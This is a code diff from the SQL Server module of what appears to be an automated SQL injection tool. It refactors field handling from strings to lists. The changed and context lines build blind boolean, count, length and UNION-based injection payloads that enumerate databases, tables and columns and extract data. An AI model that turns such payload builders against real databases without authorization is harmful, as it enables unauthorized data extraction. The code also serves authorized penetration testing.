@@ -37,33 +37,33 @@ class SQLServerMole(DbmsMole):
     def _schemas_query_info(self):
         return {
             'table' : 'master..sysdatabases',
-            'field' : 'name'
+            'field' : ['name']
         }
 
     def _tables_query_info(self, db):
         return {
             'table' : db + '..sysobjects',
-            'field' : 'name',
+            'field' : ['name'],
             'filter': "xtype = 'U'"
         }
         
     def _columns_query_info(self, db, table):
         return {
             'table' : '{db}..syscolumns,{db}..sysobjects'.format(db=db),
-            'field' : '{db}..syscolumns.name'.format(db=db),
+            'field' : ['{db}..syscolumns.name'.format(db=db)],
             'filter': "{db}..syscolumns.id = {db}..sysobjects.id and {db}..sysobjects.name = '{table}'".format(db=db, table=table)
         }
 
     def _fields_query_info(self, fields, db, table, where):
         return {
             'table' : db + '..' + table,
-            'field' : ','.join(fields),
+            'field' : fields,
             'filter': where
         }
 
     def _dbinfo_query_info(self):
         return {
-            'field' : 'user_name(),@@version,db_name()', 
+            'field' : ['user_name()','@@version','db_name()'], 
             'table' : 'information_schema.schemata'
         }
 
@@ -71,15 +71,15 @@ class SQLServerMole(DbmsMole):
     def forge_blind_query(self, index, value, fields, table, where="1=1", offset=0):
         return (' and {op_par}' + (str(value) + ' < (select top 1 ascii(substring({fields}, '+str(index)+', 1)) from ' + 
                '{table} where {where} and {fields} not in (select top {off} {fields} from {table} where {where}))').format(
-                    table=table, fields=fields, where=self.parse_condition(where), off=offset)
+                    table=table, fields=self._concat_fields(fields), where=self.parse_condition(where), off=offset)
                 )
         
     def forge_blind_count_query(self, operator, value, table, where="1=1"):
         return ' and {op_par}' + str(value) + ' ' + operator + ' (select count(*) from '+table+' where '+self.parse_condition(where)+')'
 
-    def forge_blind_len_query(self, operator, value, field, table, where="1=1", offset=0):
+    def forge_blind_len_query(self, operator, value, fields, table, where="1=1", offset=0):
         return (' and {op_par}' + (str(value) + ' ' + operator + ' (select top 1 len({field}) from {table} where ' + 
-                '{where} and {field} not in (select top {off} {field} from {table} where {where}))').format(table=table,field=field,where=self.parse_condition(where),off=offset))
+                '{where} and {field} not in (select top {off} {field} from {table} where {where}))').format(table=table,field=self._concat_fields(fields),where=self.parse_condition(where),off=offset))
 
     @classmethod
     def blind_field_delimiter(cls):
@@ -130,14 +130,14 @@ class SQLServerMole(DbmsMole):
     def forge_count_query(self, column_count, fields, table_name, injectable_field, where = "1=1"):
         query = " and 1 = 0 UNION ALL SELECT TOP 1 "
         query_list = list(self.query)
-        query_list[injectable_field] = (SQLServerMole.out_delimiter + '+cast(count(' + fields + ') as varchar(50))+' + SQLServerMole.out_delimiter)
+        query_list[injectable_field] = (SQLServerMole.out_delimiter + '+cast(count(' + ','.join(fields) + ') as varchar(50))+' + SQLServerMole.out_delimiter)
         query += ','.join(query_list)
         return query + " from " + table_name + " where " + self.parse_condition(where)
 
     def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = " and 1 = 0 UNION ALL SELECT TOP 1 "
         query_list = list(self.query)
-        fields = self._concat_fields(fields.split(','))
+        fields = self._concat_fields(fields)
         query_list[injectable_field] = (SQLServerMole.out_delimiter + "+" + fields + "+" + SQLServerMole.out_delimiter)
         where = self.parse_condition(where)
         query += ','.join(query_list)
